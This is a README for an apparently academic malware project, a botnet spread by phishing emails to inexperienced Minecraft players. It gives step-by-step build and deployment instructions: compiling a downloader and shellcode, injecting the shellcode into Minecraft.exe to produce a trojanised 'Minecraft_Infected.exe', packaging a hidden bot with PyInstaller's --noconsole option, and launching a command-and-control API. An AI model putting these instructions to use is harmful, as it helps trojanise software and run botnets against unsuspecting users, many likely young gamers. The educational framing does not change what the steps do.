# MALW-MinecraftBotnet

MinecraftBotnet is a project develop to create an automated botnet which propagate though phishing emails. The target audience would be unexperienced people that plays Minecraft. This project was develop as Assignment during the Malware's subject of the Master's degree in Cybersecurity (UPC).

> [!CAUTION]
> **DISCLAIMER: This project was done for educational purposes. We are not responsible for the use you give it.**

## Structure

This project was divided in 5 sections that focuses in different aspects of the botnet guts.

1. [API](/API/): Simple webserver API which will provide all available files to be downloaded and shedule each machine, inside the botnet, to execute the desired tasks.
1. [InfectPE](/InfectPE/): This folder contains a self-version program which allows to inject shellcode into any executable via the creation of a new section. Original version [InfectPE](https://github.com/secrary/InfectPE).
1. [Malware](/Malware/): Main program that executes in the victim's computer.
1. [Payload](/Payload/): The shellcode script that will be injected into the executable, and another c++ script that will be downloaded by the shellcode, in charge of setting up the malware in victim's computer.
1. [Scripts](/Scripts/): This folder contains the task that is executed by the malware.

## Intruction:

### Compiling shellcode and mainDownloader
Maindownloader:

- `$ cd /Payload`
- `$ gcc -m32 MainDownloader.c -o MainDownloader.exe -lurlmon`
- Now, you can place the generated executable inside [API downloads folder](/API/downloads).


Payload (shellcode):
* `$ cd /Payload`
* `$ ./ShellcodeCompiler_x64.exe -r payload.cpp -a _assembly.asm -p win_x86`
* Inside the generated file `_assembly.asm` you must manually modify the assembly instruction to fix a bug. You must replace the instruction `mov eax, fs:[ecx + 0x30]` with `mov eax, [fs:ecx + 0x30]`.
* `$ nasm -g -f win32 _assembly.asm -o _assembly.o`
* `$ C:/MinGW/bin/ld.exe -g -mi386pe _assembly.o -o _assembly.exe`
>
* `$ objdump -d _assembly.exe`
  * ¡Gitbash required or any alternative! *See tmp.txt file to see the desired output
* Paste the .text section inside tmp.txt file
* `$ python dumpShellcode.py tmp.txt`

> [!TIP]
> You can use any other alternative to ouput the shellcode from an excutable.

> [!WARNING]
> We have encountered several errors with the gcc distribution. To compile the MainDownloader, we have used the `LLVM` distribution; however, for the shellcode part we have used `MinGW` distribution.

> [!IMPORTANT]
> You will need gcc, gcc for mutiplatform (32 bits), and nasm installed.

### Compiling the tasks
* `$ cd /Scripts`
* `$ python -m PyInstaller --onefile --noconsole times.py`
* Now, you can place the generated executable inside [API downloads folder](/API/downloads).

> [!IMPORTANT]
> You will need python installed with the module PyInstaller.

### Compiling the malware
* `$ cd /Malware`
* `$ python -m PyInstaller --onefile --noconsole botScript.py`
* Now, you can place the generated executable inside [API downloads folder](/API/downloads).

> [!IMPORTANT]
> You will need python installed with the module PyInstaller.

### Infecting the Minecraft executable
* Paste the shellcode generated previously inside the file `infectPE.cpp` - `char shellcode[] =`.
>
* `$ g++ -c PE.cpp -std=c++17`
* `$ g++ -c InfectPE.cpp -std=c++17`
* `$ g++ -o InfectPE.exe InfectPE.o PE.o`
* `$ ./InfectPE.exe ./Minecraft/Minecraft.exe ./Minecraft/Minecraft_Infected.exe`
* Now, you can place `./Minecraft/Minecraft_Infected.exe` inside [API downloads folder](/API/downloads).

## Running the Botnet server:
Before starting the server, remember to change the IP address depending on how you setup the network or the server itself (you could use directly `0.0.0.0:80`) inside `/API/BotnetAPI.py`.
> [!IMPORTANT]
> Keep in mind, that changing the IP implies changing the following files: payload.cpp, MainDownloader.c, botScript.py, and BotnetAPI.py. In addition, changing the payload and the MainDownloader involves translating to asm, compiling, and replacing the shellcode string again in infectPE.cpp. 

* `$ cd /API`
* `$ pip install -r requirements.txt`
* `$ python BotnetAPI.py`

> [!IMPORTANT]
> You will need python installed.

> [!TIP]
> Theoretically, you can deploy this API to docker; however, it was not tested for this project.

## Considerations

As the configuration varies from one computer/VM to another, the IP's may vary as well. For that reason, you should replace any IP from the Payload, MainDownloader or Malware scripts.
